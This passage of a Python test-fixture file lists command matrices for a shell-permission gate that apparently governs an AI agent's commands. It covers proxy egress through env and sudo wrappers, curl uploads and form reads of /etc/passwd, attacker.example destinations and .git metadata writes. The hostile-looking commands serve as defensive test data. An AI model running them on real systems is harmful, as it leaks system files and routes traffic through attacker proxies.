            "setsid",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "ionice",
            "-c",
            "2",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "taskset",
            "-c",
            "0",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "time",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "flock",
            "-n",
            "lockfile",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "sudo",
            "-u",
            "root",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "command",
            "curl",
            "http://localhost/",
        ]
    },
    # Nested wrappers, and a wrapper spelled OUTSIDE the env.
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "nice",
            "nice",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "nice",
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "curl",
            "http://localhost/",
        ]
    },
    # A command-prefix assignment on the wrapper itself.
    {
        "argv": [
            "HTTPS_PROXY=http://attacker.example:3128",
            "nice",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "ALL_PROXY=http://attacker.example:3128",
            "sudo",
            "-u",
            "root",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "HTTPS_PROXY=http://attacker.example:3128",
            "nohup",
            "curl",
            "http://localhost/",
        ]
    },
    # Statement-persistent bindings reach a wrapped client (raw: the `;`
    # spelling shlex.join cannot express).
    {
        "argv": [
            "ALL_PROXY=http://attacker.example:3128;",
            "sudo",
            "-u",
            "root",
            "curl",
            "http://localhost/",
        ],
        "raw": "ALL_PROXY=http://attacker.example:3128; sudo -u root curl http://localhost/",
    },
    {
        "argv": [
            "export",
            "ALL_PROXY=http://attacker.example:3128;",
            "nohup",
            "curl",
            "http://localhost/",
        ],
        "raw": (
            "export ALL_PROXY=http://attacker.example:3128; "
            "nohup curl http://localhost/"
        ),
    },
    {
        "argv": [
            "ALL_PROXY=http://attacker.example:3128;",
            "nice",
            "curl",
            "http://localhost/",
        ],
        "raw": "ALL_PROXY=http://attacker.example:3128; nice curl http://localhost/",
    },
    # Nested shells inherit the enclosing statement's bindings, and an env
    # operand survives into the payload — including the modeled env -i
    # spelling (the operand precedes the flag; the leading -i form stays
    # unmodeled and fails closed, pinned below).
    {
        "argv": [
            "ALL_PROXY=http://attacker.example:3128;",
            "sh",
            "-c",
            "curl http://localhost/",
        ],
        "raw": "ALL_PROXY=http://attacker.example:3128; sh -c 'curl http://localhost/'",
    },
    {
        "argv": [
            "HTTPS_PROXY=http://attacker.example:3128",
            "sh",
            "-c",
            "curl http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "sh",
            "-c",
            "curl http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "-i",
            "sh",
            "-c",
            "curl http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "ALL_PROXY=http://attacker.example:3128",
            "bash",
            "-c",
            "curl http://localhost/",
        ]
    },
    {
        "argv": [
            "sudo",
            "-u",
            "root",
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "ALL_PROXY=http://attacker.example:3128;",
            "sg",
            "docker",
            "-c",
            "curl http://localhost/",
        ],
        "raw": (
            "ALL_PROXY=http://attacker.example:3128; "
            "sg docker -c 'curl http://localhost/'"
        ),
    },
    # The second modeled client class through a wrapper chain.
    {
        "argv": [
            "env",
            "ALL_PROXY=http://attacker.example:3128",
            "nice",
            "wget",
            "--max-redirect=0",
            "http://localhost/",
        ]
    },
    # The leading env -i form is unmodeled and fails closed independently
    # of the proxy gate (the modeled spelling pins the gate above).
    {
        "argv": [
            "env",
            "-i",
            "HTTPS_PROXY=http://attacker.example:3128",
            "sh",
            "-c",
            "curl http://localhost/",
        ]
    },
    # Negative controls: a loopback proxy, a non-proxy binding, and a bare
    # wrapper keep the destination established (run-class).
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://127.0.0.1:3128",
            "nice",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "ALL_PROXY=http://127.0.0.1:3128;",
            "sudo",
            "-u",
            "root",
            "curl",
            "http://localhost/",
        ],
        "raw": ("ALL_PROXY=http://127.0.0.1:3128; sudo -u root curl http://localhost/"),
    },
    {"argv": ["X=1", "nice", "curl", "http://localhost/"]},
    {"argv": ["env", "FOO=1", "nice", "curl", "http://localhost/"]},
    {"argv": ["nice", "curl", "http://localhost/"]},
]


# Deep-review round 4: the declaration-binding walk matrix. A prefix
# assignment demotes the export/typeset/... form to a plain command node, but
# the runtime declaration semantics are unchanged — the shell really exports
# the name — so the exported proxy gates a later client exactly like the
# unprefixed form. An &&/||-guarded declaration whose guard may be false at
# runtime records a CANDIDATE binding instead of clearing or overwriting a
# binding an earlier unconditional declaration established: the gate fires
# when any candidate value in any reachable branch is a non-loopback proxy
# (union semantics, fail-closed), so a guarded loopback overwrite can never
# un-gate a known non-loopback proxy. Rows append after R3; ids continue.
PERMISSION_R4_CASES: list[dict[str, Any]] = [
    # Defect A: the prefix-declared export binds (gated).
    {
        "argv": [
            "X=1",
            "export",
            "ALL_PROXY=http://attacker.example:3128",
            "&&",
            "curl",
            "http://localhost:8080/pubstatus",
        ],
        "raw": (
            "X=1 export ALL_PROXY=http://attacker.example:3128 && "
            "curl http://localhost:8080/pubstatus"
        ),
    },
    # The quoted spelling binds through its quoting exactly like the bare
    # form.
    {
        "argv": [
            "X=1",
            "export",
            "ALL_PROXY=http://attacker.example:3128",
            "&&",
            "curl",
            "http://localhost:8080/pubstatus",
        ],
        "raw": (
            "X=1 export 'ALL_PROXY=http://attacker.example:3128' && "
            "curl http://localhost:8080/pubstatus"
        ),
    },
    # Control: the loopback spelling really exports too; the destination
    # stays established.
    {
        "argv": [
            "X=1",
            "export",
            "ALL_PROXY=http://127.0.0.1:3128",
            "&&",
            "curl",
            "http://localhost:8080/pubstatus",
        ],
        "raw": (
            "X=1 export ALL_PROXY=http://127.0.0.1:3128 && "
            "curl http://localhost:8080/pubstatus"
        ),
    },
    # Defect B: the guarded loopback overwrite must not un-gate the known
    # non-loopback proxy the runtime never replaced (printenv-verified: the
    # guarded export does not run).
    {
        "argv": [
            "export",
            "HTTP_PROXY=http://known.example:3128",
            "&&",
            "false",
            "&&",
            "export",
            "HTTP_PROXY=http://127.0.0.1:9999",
            "&&",
            "curl",
            "http://localhost:8080/pubstatus",
        ],
        "raw": (
            "export HTTP_PROXY=http://known.example:3128 && false && "
            "export HTTP_PROXY=http://127.0.0.1:9999 && "
            "curl http://localhost:8080/pubstatus"
        ),
    },
    # The union direction: a guarded NON-loopback candidate over an
    # unconditional loopback binding gates too.
    {
        "argv": [
            "export",
            "HTTP_PROXY=http://127.0.0.1:9999",
            "&&",
            "false",
            "&&",
            "export",
            "HTTP_PROXY=http://attacker.example:3128",
            "&&",
            "curl",
            "http://localhost:8080/pubstatus",
        ],
        "raw": (
            "export HTTP_PROXY=http://127.0.0.1:9999 && false && "
            "export HTTP_PROXY=http://attacker.example:3128 && "
            "curl http://localhost:8080/pubstatus"
        ),
    },
    # Control: a guarded BARE assignment is not exported, so it never
    # reaches a child process — it neither gates nor clears anything.
    {
        "argv": [
            "true",
            "&&",
            "ALL_PROXY=http://attacker.example:3128",
            "&&",
            "curl",
            "http://localhost:8080/pubstatus",
        ],
        "raw": (
            "true && ALL_PROXY=http://attacker.example:3128 && "
            "curl http://localhost:8080/pubstatus"
        ),
    },
    # Control: an UNGUARDED loopback overwrite really runs, so the last
    # literal binding wins and the destination stays established.
    {
        "argv": [
            "export",
            "HTTP_PROXY=http://127.0.0.1:9999",
            "&&",
            "curl",
            "http://localhost:8080/pubstatus",
        ],
        "raw": (
            "export HTTP_PROXY=http://127.0.0.1:9999 && "
            "curl http://localhost:8080/pubstatus"
        ),
    },
    # Control: a known non-loopback proxy gates the client (unchanged).
    {
        "argv": [
            "export",
            "HTTP_PROXY=http://known.example:3128",
            "&&",
            "curl",
            "http://localhost:8080/pubstatus",
        ],
        "raw": (
            "export HTTP_PROXY=http://known.example:3128 && "
            "curl http://localhost:8080/pubstatus"
        ),
    },
]


# Deep-review round 3 (R5): the nested-bare-repository metadata gate. A bare
# repository carries its Git metadata directly in its directory (a HEAD file
# plus objects/ and refs/ — git's own heuristic), so mutating operands that
# reach inside it are gated exactly like .git operands: the operand guard
# probes the operand's own resolved ancestry, which also finds a bare
# repository reached through a symlinked directory component. Reads of bare
# metadata stay ungated, the recursive-rm R7 gate is unchanged (an operand
# encompassing the bare repository resolves handoff — its commits are
# unpushed with no configured remote), and ordinary cp/rm stay permitted.
# Rows append after R4; ids continue.
PERMISSION_R5_CASES: list[dict[str, Any]] = [
    # Mutating operands reaching inside the nested bare metadata.
    {"argv": ["cp", "backup.git/config", "copy.txt"], "cwd": "bare-nested"},
    {"argv": ["cp", "backup.git/HEAD", "copy.txt"], "cwd": "bare-nested"},
    {
        "argv": [
            "cp",
            f"backup.git/objects/{_BARE_NESTED_OBJECT[:2]}/{_BARE_NESTED_OBJECT[2:]}",
            "copy.txt",
        ],
        "cwd": "bare-nested",
    },
    {"argv": ["cp", "-r", "backup.git", "backup-copy"], "cwd": "bare-nested"},
    {"argv": ["mv", "backup.git/config", "moved-config"], "cwd": "bare-nested"},
    {"argv": ["rm", "backup.git/config"], "cwd": "bare-nested"},
    {
        "argv": [
            "rm",
            f"backup.git/objects/{_BARE_NESTED_OBJECT[:2]}/{_BARE_NESTED_OBJECT[2:]}",
        ],
        "cwd": "bare-nested",
    },
    {"argv": ["sed", "-i", "s/x/y/", "backup.git/config"], "cwd": "bare-nested"},
    {"argv": ["tee", "backup.git/config"], "cwd": "bare-nested"},
    {"argv": ["mkdir", "backup.git/hooks2"], "cwd": "bare-nested"},
    {"argv": ["ln", "backup.git/config", "hardlink"], "cwd": "bare-nested"},
    {
        "argv": ["install", "tracked.txt", "backup.git/hooks/pre-push"],
        "cwd": "bare-nested",
    },
    {
        "argv": ["echo", "x", ">", "backup.git/config"],
        "raw": "echo x > backup.git/config",
        "cwd": "bare-nested",
    },
    # The same writes through a symlinked directory component.
    {"argv": ["cp", "link/config", "copy.txt"], "cwd": "bare-nested"},
    {"argv": ["rm", "link/config"], "cwd": "bare-nested"},
    {"argv": ["cp", "-r", "link", "link-copy"], "cwd": "bare-nested"},
    # The recursive-rm R7 gate is unchanged: the operand encompassing the
    # bare repository resolves handoff (unpushed commits, no remote), and
    # an operand reaching INSIDE its metadata is gated by the operand
    # guard itself.
    {"argv": ["rm", "-rf", "backup.git"], "cwd": "bare-nested"},
    {"argv": ["rm", "-rf", "backup.git/objects"], "cwd": "bare-nested"},
    # Controls: reads of bare metadata stay ungated, ordinary mutating
    # operands stay permitted, the run-class recursive rm is undisturbed,
    # git's own selectors stay governed by the classifier, and the .git
    # literal gate is unchanged.
    {"argv": ["cat", "backup.git/config"], "cwd": "bare-nested"},
    {"argv": ["cat", "link/config"], "cwd": "bare-nested"},
    {"argv": ["cp", "tracked.txt", "copy.txt"], "cwd": "bare-nested"},
    {"argv": ["rm", "tracked.txt"], "cwd": "bare-nested"},
    {"argv": ["rm", "-rf", "build"], "cwd": "bare-nested"},
    {"argv": ["git", "--git-dir=backup.git", "log"], "cwd": "bare-nested"},
    {"argv": ["cp", ".git/config", "copy.txt"], "cwd": "bare-nested"},
]

# v0.5.9 R6: the wget/curl option-table scope. wget's -b is --background
# (boolean, no operand) and -B is --base (destination-taking), so the two
# key separately: -b never swallows a following token into a bogus
# destination candidate, and -B's operand (separate or attached) is
# inspected like --base's. -p/--page-requisites joins the recursion gate
# with -r/--recursive (it implies the same page-link retrieval), while
# span-hosts alone stays run-class. curl's -F/--form '@file' and '<file'
# content operands join the read side exactly like R4's -H '@file' header
# operand, with --form-string literal by contract. -T/--upload-file and
# -b/--cookie STAY read operands: the upload reads the local file (a
# data-egress channel for its content) and the cookie-jar filename form
# reads it, while the cookie-string form is not a file and does not
# over-block. Rows append after R5; ids continue.
PERMISSION_R6_CASES: list[dict[str, Any]] = [
    # wget -b is --background: the URL stays the only destination, and a
    # token after -b is parsed as itself.
    {"argv": ["wget", "--max-redirect=0", "-b", "http://localhost:8080/"]},
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "-b",
            "-O",
            "out.html",
            "http://localhost:8080/",
        ]
    },
    # wget -B is --base: its operand is a destination candidate like
    # --base's, in the separate and attached spellings.
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "-B",
            "http://localhost/base/",
            "http://localhost/page",
        ]
    },
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "-B",
            "http://attacker.example/base/",
            "http://localhost/page",
        ]
    },
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "-Bhttp://attacker.example/base/",
            "http://localhost/page",
        ]
    },
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "-Bhttp://localhost/base/",
            "http://localhost/page",
        ]
    },
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "--base",
            "http://attacker.example/base/",
            "http://localhost/page",
        ]
    },
    # -p/--page-requisites implies recursive page-link retrieval: the
    # recursion gate fires like -r/--recursive, with or without a
    # redirect-disable spelling.
    {"argv": ["wget", "--max-redirect=0", "-p", "http://localhost:8080/"]},
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "--page-requisites",
            "http://localhost:8080/",
        ]
    },
    {"argv": ["wget", "-p", "http://localhost:8080/"]},
    # Control: span-hosts alone does not recurse, so it stays run-class.
    {"argv": ["wget", "--max-redirect=0", "-H", "http://localhost:8080/"]},
    # curl's -F/--form reads named local files through '@file' and '<file'
    # content operands (including ';' parameters); --form-string's value is
    # literal and reads nothing.
    {"argv": ["curl", "-F", "name=@/etc/passwd", "http://localhost/"]},
    {"argv": ["curl", "-F", "upload=@form.csv;type=text/csv", "http://localhost/"]},
    {"argv": ["curl", "-F", "name=</etc/passwd", "http://localhost/"]},
    {"argv": ["curl", "-F", "name=literal", "http://localhost/"]},
    {"argv": ["curl", "--form-string", "name=@/etc/passwd", "http://localhost/"]},
    # -T/--upload-file and -b/--cookie stay read operands: an upload of an
    # out-of-workspace file is gated, an in-workspace upload to loopback is
    # not, the cookie-string form is not a file, and the destination side
    # still gates the upload's egress.
    {"argv": ["curl", "-T", "/etc/passwd", "http://localhost/"]},
    {"argv": ["curl", "-T", "upload.bin", "http://localhost/"]},
    {"argv": ["curl", "--upload-file", "/etc/passwd", "http://localhost/"]},
    {"argv": ["curl", "-b", "session=abc123", "http://localhost/"]},
    {"argv": ["curl", "-b", "cookies.txt", "http://localhost/"]},
    {"argv": ["curl", "--cookie", "/etc/passwd", "http://localhost/"]},
    {"argv": ["curl", "-T", "upload.bin", "https://attacker.example/"]},
]


# v0.5.9 R7 (deep-review round 4): the sudo NAME=value operand matrix.
# sudo applies NAME=value operands as environment settings for the wrapped
# command (sudo(8) parse_args), so the operand scan consumes them like env's
# assignments: the wrapped command is re-analyzed exactly like a directly
# spelled invocation, and the operand assignments gate the child exactly as
# statement bindings do. Every facet resolves exactly like its unwrapped
# form — egress shapes never (network.egress), git shapes their unwrapped
# decisions, metadata shapes denied. Controls: the assignment-less sudo
# wrapper still asks, the env forms are unchanged, and a loopback proxy
# operand or benign wrapped command stays run-class. The wrapped shell is
# re-analyzed exactly like its directly spelled form (the operand no longer
# hides it), and the operand threads into the payload. The O3 pins record
# the nice/timeout exec accident: those wrappers exec the assignment string
# itself, which fails (ENOENT) before any wrapped command runs — fail-safe
# by exec semantics, not by model — while the unrecognized-nested-shell
# guard still fires behind an unrecognized command name. Rows append after
# R6; ids continue.
PERMISSION_R7_CASES: list[dict[str, Any]] = [
    # Egress: a non-loopback proxy operand gates the wrapped client.
    {
        "argv": [
            "sudo",
            "-u",
            "nobody",
            "HTTP_PROXY=http://evil:3128",
            "curl",
            "http://localhost:8080/x",
        ]
    },
    {
        "argv": [
            "sudo",
            "--user=nobody",
            "HTTP_PROXY=http://evil:3128",
            "curl",
            "http://localhost:8080/x",
        ]
    },
    {
        "argv": [
            "sudo",
            "-u",
            "nobody",
            "HTTP_PROXY=http://evil:3128",
            "--",
            "curl",
            "http://localhost:8080/x",
        ]
    },
    {
        "argv": [
            "sudo",
            "-u",
            "nobody",
            "A=1",
            "HTTP_PROXY=http://evil:3128",
            "curl",
            "http://localhost:8080/x",
        ]
    },
    # Git: the wrapped command re-analyzes to its unwrapped decision.
    {"argv": ["sudo", "-u", "nobody", "X=1", "git", "push"]},
    {"argv": ["sudo", "--user=nobody", "X=1", "git", "push"]},
    {"argv": ["sudo", "-u", "nobody", "X=1", "git", "reset", "--hard"]},
    {"argv": ["sudo", "-u", "nobody", "X=1", "Y=2", "git", "reset", "--hard"]},
    # Metadata: the wrapped mutating operand is denied like the unwrapped
    # form.
    {
        "argv": ["sudo", "-u", "nobody", "X=1", "cp", "plain.txt", ".git/config"],
        "cwd": "rm-clean",
    },
    {
        "argv": ["sudo", "--user=nobody", "X=1", "cp", "plain.txt", ".git/config"],
        "cwd": "rm-clean",
    },
    {"argv": ["sudo", "-u", "nobody", "X=1", "rm", "-rf", ".git"], "cwd": "rm-clean"},
    {
        "argv": ["sudo", "-u", "nobody", "X=1", "Y=2", "rm", "-rf", ".git"],
        "cwd": "rm-clean",
    },
    # The assignment after the option terminator gates the same way.
    {"argv": ["sudo", "-u", "nobody", "--", "X=1", "git", "push"]},
    {
        "argv": ["sudo", "-u", "nobody", "--", "X=1", "rm", "-rf", ".git"],
        "cwd": "rm-clean",
    },
    # Controls: the assignment-less wrapper still asks; the env form is
    # unchanged; a loopback proxy operand and benign wrapped commands stay
    # run-class.
    {"argv": ["sudo", "-u", "nobody", "git", "push"]},
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://evil:3128",
            "curl",
            "http://localhost:8080/x",
        ]
    },
    {
        "argv": [
            "sudo",
            "-u",
            "nobody",
            "HTTP_PROXY=http://127.0.0.1:3128",
            "curl",
            "http://localhost:8080/x",
        ]
    },
    {"argv": ["sudo", "-u", "nobody", "X=1", "git", "status"]},
    {"argv": ["sudo", "-u", "nobody", "git", "status"]},
    # The wrapped shell is re-analyzed exactly like its directly spelled
    # form (the operand no longer hides it), and the operand threads into
    # the payload.
    {
        "argv": ["sudo", "-u", "nobody", "X=1", "sh", "-c", "git push"],
        "raw": "sudo -u nobody X=1 sh -c 'git push'",
    },
    {
        "argv": [
            "sudo",
            "-u",
            "nobody",
            "HTTP_PROXY=http://evil:3128",
            "sh",
            "-c",
            "curl http://localhost:8080/x",
        ],
        "raw": (
            "sudo -u nobody HTTP_PROXY=http://evil:3128 "
            "sh -c 'curl http://localhost:8080/x'"
        ),
    },
    # A wrapped env child without its own leading assignment fails closed
    # exactly like the directly spelled form.
    {"argv": ["sudo", "-u", "nobody", "X=1", "env", "curl", "http://localhost:8080/x"]},
    # O3 pins: nice/timeout exec the assignment string itself (ENOENT
    # before any wrapped command runs) — fail-safe by exec semantics, so
    # the routine resolution is pinned, not a gate bypass. The
    # unrecognized-nested-shell guard still fires behind an unrecognized
    # command name.
    {
        "argv": [
            "nice",
            "-n",
            "5",
            "HTTP_PROXY=http://evil:3128",
            "curl",
            "http://localhost:8080/x",
        ]
    },
    {
        "argv": [
            "timeout",
            "10",
            "HTTP_PROXY=http://evil:3128",
            "curl",
            "http://localhost:8080/x",
        ]
    },
    {"argv": ["nice", "-n", "5", "X=1", "git", "push"]},
    {"argv": ["timeout", "10", "X=1", "git", "push"]},
    {
        "argv": ["nice", "-n", "5", "X=1", "sh", "-c", "git push"],
        "raw": "nice -n 5 X=1 sh -c 'git push'",
    },
]


# v0.5.9 R8 (deep-review round 4 follow-up): the env invalid-name operand
# matrix. env applies every pre-command operand containing `=` — putenv(3)
# does not validate the name, so `env FOO=1 1X=1 printenv 1X` prints the
# value — so the operand scan consumes them all, whatever the name: the
# wrapped command is re-analyzed exactly like a directly spelled invocation
# and no longer hides behind an invalid-name operand. The consumed operands
# also reach the documented assignment-name audit (uppercase names only),
# which aggregates fail-closed with the wrapped command's own gate exactly
# like the strict-valid lowercase equivalent (`env FOO=1 x=1 git push`) and
# the shell-level spelling (`1X=1 git push`); hard-guard inner commands keep
# their unwrapped denial verbatim. Controls: the uppercase-operand and
# assignment-less env forms are unchanged, a leading invalid name still fails
# closed at admission, a non-assignment operand stays the command, and the
# sudo forms from R7 are unchanged. Rows append after R7; ids continue.
PERMISSION_R8_CASES: list[dict[str, Any]] = [
    # Egress: a non-loopback proxy operand gates the wrapped client even
    # when an invalid-name operand shifts it into the assignment prefix.
    {
        "argv": [
            "env",
            "FOO=1",
            "1X=1",
            "HTTP_PROXY=http://evil:3128",
            "curl",
            "http://localhost:8080/x",
        ]
    },
    {
        "argv": [
            "env",
            "FOO=1",
            "1X=1",
            "http_proxy=http://evil:3128",
            "wget",
            "--max-redirect=0",
            "http://localhost:8080/x",
        ]
    },
    # Git: the wrapped command re-analyzes to its unwrapped decision.
    {"argv": ["env", "FOO=1", "1X=1", "git", "push"]},
    {"argv": ["env", "FOO=1", "1X=1", "git", "push", "--force"]},
    {"argv": ["env", "FOO=1", "1X=1", "git", "reset", "--hard"]},
    # Metadata: the wrapped mutating operand is denied like the unwrapped
    # form.
    {
        "argv": ["env", "FOO=1", "1X=1", "cp", "plain.txt", ".git/config"],
        "cwd": "rm-clean",
    },
    {"argv": ["env", "FOO=1", "1X=1", "rm", "-rf", ".git"], "cwd": "rm-clean"},
    # Every assignment shape env applies: an empty name (quoted so the
    # shell keeps it literal), a name containing `/`, several invalid
    # names, an invalid name before a strict one, and one after the option
    # terminator.
    {"argv": ["env", "FOO=1", "=x", "git", "push"], "raw": "env FOO=1 '=x' git push"},
    {"argv": ["env", "FOO=1", "/a=b", "git", "push"]},
    {"argv": ["env", "FOO=1", "1X=1", "Y2=2", "git", "push"]},
    {"argv": ["env", "FOO=1", "1X=1", "BAR=2", "git", "push"]},
    {"argv": ["env", "FOO=1", "--", "1X=1", "git", "push"]},
    # The wrapped shell is re-analyzed exactly like its directly spelled
    # form (the operand no longer hides it), and the operand threads into
    # the payload.
    {
        "argv": ["env", "FOO=1", "1X=1", "sh", "-c", "git push"],
        "raw": "env FOO=1 1X=1 sh -c 'git push'",
    },
    {
        "argv": [
            "env",
            "FOO=1",
            "1X=1",
            "HTTP_PROXY=http://evil:3128",
            "sh",
            "-c",
            "curl http://localhost:8080/x",
        ],
        "raw": (
            "env FOO=1 1X=1 HTTP_PROXY=http://evil:3128 "
            "sh -c 'curl http://localhost:8080/x'"
        ),
    },
    # A nested env child with its own leading assignment gates the same way.
    {"argv": ["env", "FOO=1", "1X=1", "env", "BAR=2", "git", "push"]},
    # The invalid-name operand is consumed, never the command: an unmodeled
    # wrapped command resolves like its directly spelled form.
    {"argv": ["env", "FOO=1", "1X=1", "printenv", "1X"]},
    # Controls: the uppercase-operand form still asks, the strict-valid
    # lowercase form keeps its pre-existing audit denial (the invalid-name
    # form now matches it), a leading invalid name and the assignment-less
    # form still fail closed at admission, a non-assignment operand stays
    # the command, a benign or loopback wrapped command keeps the audit
    # denial, a dash-prefixed assignment-shaped operand still fails closed
    # at option parsing, and the R7 sudo forms are unchanged.
    {"argv": ["env", "FOO=1", "X=1", "git", "push"]},
    {"argv": ["env", "FOO=1", "x=1", "git", "push"]},
    {"argv": ["env", "1X=1", "git", "push"]},
    {"argv": ["env", "git", "push"]},
    {"argv": ["env", "FOO=1", "foo.txt", "git", "push"]},
    {"argv": ["env", "FOO=1", "1X=1", "git", "status"]},
    {
        "argv": [
            "env",
            "FOO=1",
            "1X=1",
            "HTTP_PROXY=http://127.0.0.1:3128",
            "curl",
            "http://localhost:8080/x",
        ]
    },
    {"argv": ["env", "FOO=1", "-Q=2", "git", "push"]},
    {"argv": ["sudo", "-u", "nobody", "1X=1", "git", "push"]},
]


# v0.5.9 R9 (deep-review round 4): the destination/option-model
# completeness matrix. (1) curl's --libcurl writes the libcurl-equivalent
# C source to its file, so its operand joins the write surface: an
# out-of-workspace or Git-metadata target denies like any write operand,
# and an in-workspace target stays run-class. (2) The HSTS options are
# read AND written (the cache is loaded at startup and saved back at
# exit), so curl's --hsts and wget's --hsts-file join the write surface
# the same way; before this round their values surfaced as destination
# candidates instead. (3) curl's -F/--form ';'-separated parameters read
# a file through headers=@file (the headers="..." form is literal), so
# the form parser extracts that read exactly like the content part's
# @file/<file forms — the workspace and sensitive-file read floor applies
# to it. (4) The inet_aton shorthand recognizer accepts ASCII digits only
# and wraps its conversions: a Unicode digit component (superscript or
# fullwidth) or an invalid octal component ("08") no longer crashes or
# misclassifies — the host resolves non-loopback, ask-class, like any
# spelling real inet_aton sends to DNS. (5) The derivable download
# destinations join the write surface: curl's -O/--remote-name and a
# plain wget write the URL's file part in the working directory, so the
# submission scan sees them; the permission decision is unchanged for an
# in-workspace target, and a sensitive derived name (a .env basename)
# denies like any write operand. The audit also found wget's
# --directory-prefix long spelling missing from the scanner table (the -P
# write operand was never collected in that spelling and its value
# surfaced as a destination candidate); it is keyed like -P now. (6) The
# unknown-option posture is pinned:
# an unknown boolean long option is recorded raw and passes silently (the
# client itself rejects it and fails before connecting), while an unknown
# value-taking option's value surfaces as a destination candidate and
# resolves ask. Rows append after R8; ids continue.
PERMISSION_R9_CASES: list[dict[str, Any]] = [
    # (1) --libcurl: the write operand is path-inspected and
    # metadata-guarded like -o/--output.
    {
        "argv": ["curl", "--libcurl", ".git/hooks/pre-commit", "http://127.0.0.1/"],
        "cwd": "rm-clean",
    },
    {"argv": ["curl", "--libcurl=/tmp/libcurl-out.c", "http://127.0.0.1/"]},
    {"argv": ["curl", "--libcurl", "client.c", "http://127.0.0.1/"]},
    # (2) The HSTS cache files are read and written: the write operand is
    # path-inspected and metadata-guarded.
    {"argv": ["curl", "--hsts", "/tmp/hsts.txt", "http://127.0.0.1/"]},
    {
        "argv": ["curl", "--hsts", ".git/hooks/pre-commit", "http://127.0.0.1/"],
        "cwd": "rm-clean",
    },
    {"argv": ["curl", "--hsts", "hsts-cache.txt", "http://127.0.0.1/"]},
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "--hsts-file",
            "/tmp/hsts.txt",
            "http://127.0.0.1/",
        ]
    },
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "--hsts-file",
            "hsts.txt",
            "http://127.0.0.1/",
        ]
    },
    # (3) The form parameters' headers=@file reads join the read floor;
    # the literal forms read nothing.
    {"argv": ["curl", "-F", "name=ok;headers=@/etc/passwd", "http://127.0.0.1/"]},
    {"argv": ["curl", "--form", "name=ok;headers=@/etc/passwd", "http://127.0.0.1/"]},
    {"argv": ["curl", "-F", "name=ok;headers=@.env", "http://127.0.0.1/"]},
    {"argv": ["curl", "-F", 'name=ok;headers="X-Test: y"', "http://127.0.0.1/"]},
    {"argv": ["curl", "-F", "x=headers=@/etc/passwd", "http://127.0.0.1/"]},
    # (4) Non-ASCII digit components and invalid octal components resolve
    # ask-class (never loopback, never a crash); the plain shorthand
    # control stays run-class.
    {"argv": ["curl", "http://².1/"]},
    {"argv": ["curl", "http://１２７.０.０.１/"]},
    {"argv": ["curl", "http://127.08.1/"]},
    {"argv": ["curl", "http://127.1/"]},
    # (5) The derivable download destinations are collected for the
    # submission scan; the permission decision is unchanged for an
    # in-workspace target and a sensitive derived name denies.
    {"argv": ["curl", "-O", "http://127.0.0.1:8080/x"]},
    {"argv": ["curl", "--remote-name", "http://127.0.0.1:8080/x"]},
    {"argv": ["wget", "--max-redirect=0", "http://127.0.0.1:8080/x"]},
    {"argv": ["wget", "--max-redirect=0", "-P", "sub", "http://127.0.0.1:8080/x"]},
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "--directory-prefix",
            "sub",
            "http://127.0.0.1:8080/x",
        ]
    },
    {"argv": ["curl", "-O", "http://127.0.0.1:8080/.env"]},
    {"argv": ["curl", "-o", "out.txt", "http://127.0.0.1:8080/x"]},
    # (6) The unknown-option posture: an unknown boolean long option
    # passes silently (the client itself fails on it), an unknown
    # value-taking option's value is a destination candidate and asks.
    {"argv": ["curl", "--totally-unknown-flag", "http://localhost:8080/pubstatus"]},
    {"argv": ["curl", "--unknown-value-opt", "/etc/passwd", "http://localhost:8080/"]},
]


# v0.5.9 R10 (deep-review round 4, analytical seat F3): the recovery-evidence
# survival gap. The recursive-rm recovery path checked that a nested
# repository at risk has a configured, currently-fetchable remote, but never
# checked WHERE the recovery evidence lives relative to the deletion: a
# clean nested repository and its valid recovery bundle together beneath an
# ignored vendor/ directory made `rm -rf vendor` qualify run-class while
# deleting BOTH the repository and its recovery copy in one operation.
# Recovery approval now requires the configured remote's fetch target to
# survive the ENTIRE expanded deletion footprint — the target may not lie
# inside (or equal) any operand path being deleted, including other operands
# and the operand containing the at-risk repository. Local-scheme remotes
# resolve to filesystem paths and are checked for containment (absolute,
# relative, and file:// spellings alike); non-local-scheme remotes cannot lie
# inside a filesystem deletion and pass exactly as today. Controls: the
# bundle outside the footprint still recovers run-class (deleting vendor
# alone while the bundle stands in a sibling directory, or the bundle beside
# the outer repository), and the remote-scheme asymmetry is unchanged. Rows
# append after R9; ids continue.
PERMISSION_R10_CASES: list[dict[str, Any]] = [
    # The defect shape: a fetchable bundle remote whose file the operand
